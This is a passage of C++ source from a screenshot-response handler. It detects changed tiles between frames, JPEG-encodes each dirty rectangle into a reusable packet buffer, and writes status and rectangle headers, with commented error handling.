
        // SwapFrames below commits the diff base only once the response is
        // allocated; the flag drop must also hold on the alloc-failure path
        graphics.lastFrameClean = false;

        Rectangle rect(0, 0, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);

        // We are sending the full JPEG data in one segment, so the segment count is 1
        UINT32 countOfSegments = 1;

        *responseLength += sizeof(countOfSegments) + sizeof(rect.x) + sizeof(rect.y) + sizeof(rect.sizeOfData) + graphics.jpegBuffer.offset;
        *response = new CHAR[*responseLength];
        if (*response == nullptr)
        {
            LOG_ERROR("Failed to allocate the screenshot response (%u bytes of JPEG data)", graphics.jpegBuffer.offset);
            *responseLength = 0;
            return;
        }
        graphics.SwapFrames();
        BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
        writer.Write<UINT32>(StatusCode::StatusSuccess);
        writer.Write<UINT32>(countOfSegments);
        rect.toBuffer(writer.GetAddress() + writer.GetOffset());
        return;
    }

    // Fused diff + tile detection in one pass. Threshold of 24 ignores minor
    // JPEG compression artifacts from prior frames; early exit stops each
    // tile's scan at its first dirty pixel (no bidiff map materialized).
    // Clean tiles carrying sub-threshold drift are reverted inside, keeping
    // the diff base equal to what the receiver has (slow changes accumulate
    // until they cross the threshold instead of being silently absorbed).
    auto dirtyResult = ImageProcessor::FindDirtyRects(
        Span<RGB>(graphics.currentScreenshot, device.Width * device.Height),
        Span<const RGB>(graphics.screenshot, device.Width * device.Height),
        device.Width, device.Height, 64, 24);
    if (dirtyResult.IsErr())
    {
        LOG_ERROR("Failed to find dirty rectangles for display index: %u", displayIndex);
        // The gate baselined this frame but the reply never syncs the receiver
        graphics.lastFrameClean = false;
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }
    auto &dirtyRects = dirtyResult.Value();

    // Identical frames: reply success with an empty section list — skip all
    // packet allocation and encoding work
    if (dirtyRects.Count == 0)
    {
        dirtyRects.Free();
        if (!WriteIdleScreenshotResponse(response, responseLength))
        {
            LOG_ERROR("Failed to allocate the empty screenshot response for display index: %u", displayIndex);
            return;
        }
        graphics.lastFrameClean = true;
        return;
    }

    // Dirty frame on every path from here (success or a mid-encode error):
    // the receiver may end up with content the gate's baseline does not
    // reflect, so the gate must re-baseline before it may skip again
    graphics.lastFrameClean = false;

    // Persistent packet buffer, reused across frames: Init() runs on the
    // first frame and after every reply (Release empties the buffer); after
    // an aborted encode the buffer is kept and only Reset() runs, so
    // capacity is retained.
    // Sized to the actual rects (screen-content JPEG fits ~1/8 of raw RGB
    // plus header slack, the ReserveForImage heuristic) instead of a flat
    // w*h/2; underestimates still grow by doubling. The first UINT32 is the
    // status code, the second the rect count — both are written last, once
    // the final size is known.
    USIZE packetCapacity = *responseLength + sizeof(UINT32) + sizeof(UINT32);
    for (UINT32 i = 0; i < dirtyRects.Count; i++)
    {
        const DirtyRect &dr = dirtyRects.Rects[i];
        packetCapacity += (USIZE)dr.Width * dr.Height * 3 / 8 + 4096 + sizeof(UINT32) * 3;
    }
    BOOL packetReady = (graphics.packet.Data != nullptr) || graphics.packet.Init(packetCapacity);
    if (packetReady)
    {
        graphics.packet.Reset();
        packetReady = graphics.packet.Resize(sizeof(UINT32) + sizeof(UINT32));
    }
    if (!packetReady)
    {
        dirtyRects.Free();
        LOG_ERROR("Failed to allocate the screenshot packet for display index: %u", displayIndex);
        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
        return;
    }

    for (UINT32 i = 0; i < dirtyRects.Count; i++)
    {
        const DirtyRect &dr = dirtyRects.Rects[i];
        INT32 rectWidth = (INT32)dr.Width;
        INT32 rectHeight = (INT32)dr.Height;

        // Placeholder [x, y, jpegLen] header — the jpeg length is known only
        // after the encode, so it is patched in place below
        USIZE headerOffset = graphics.packet.Size;
        UINT32 rectHeader[3] = {dr.X, dr.Y, 0};
        if (!graphics.packet.Append(Span<const CHAR>((const CHAR *)rectHeader, sizeof(rectHeader))))
        {
            dirtyRects.Free();
            LOG_ERROR("Failed to grow the screenshot packet for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        // Encode straight out of the frame buffer (stride = frame width) — no
        // per-rect row gather into a staging buffer; compressed bytes land
        // directly in the packet via the callback below
        PacketJpegContext encodeContext;
        encodeContext.packet = &graphics.packet;
        encodeContext.failed = false;
        auto encodeResult = JpegEncoder::Encode(
            PacketJpegCallback, &encodeContext, (INT32)quality, rectWidth, rectHeight, 3,
            Span<const UINT8>((UINT8 *)(graphics.currentScreenshot + (USIZE)dr.Y * device.Width + dr.X),
                              ((USIZE)device.Width * device.Height - ((USIZE)dr.Y * device.Width + dr.X)) * sizeof(RGB)),
            (INT32)device.Width);
        if (encodeResult.IsErr() || encodeContext.failed)
        {
            dirtyRects.Free();
            LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        // Patch the real jpeg length into the rect header
        UINT32 jpegLength = (UINT32)(graphics.packet.Size - headerOffset - sizeof(rectHeader));
        Memory::Copy(graphics.packet.Data + headerOffset + sizeof(UINT32) * 2, &jpegLength, sizeof(jpegLength));
    }

    // Clean tiles with sub-threshold drift were reverted to the previous frame
    // inside FindDirtyRects, so it matches the receiver's canvas and becomes
    // the comparison base by pointer swap (no full-frame copy)
    graphics.SwapFrames();

    // Fill in the response header over the finished packet, then hand the exact
    // accumulated array to the caller (the caller deletes[] *response). Release
    // detaches the buffer, so the next reply re-initializes it
    BinaryWriter writer{Span<UINT8>((UINT8 *)graphics.packet.Data, graphics.packet.Size)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT32>(dirtyRects.Count);

    *responseLength = graphics.packet.Size;
    *response = graphics.packet.Release();

    dirtyRects.Free();
}
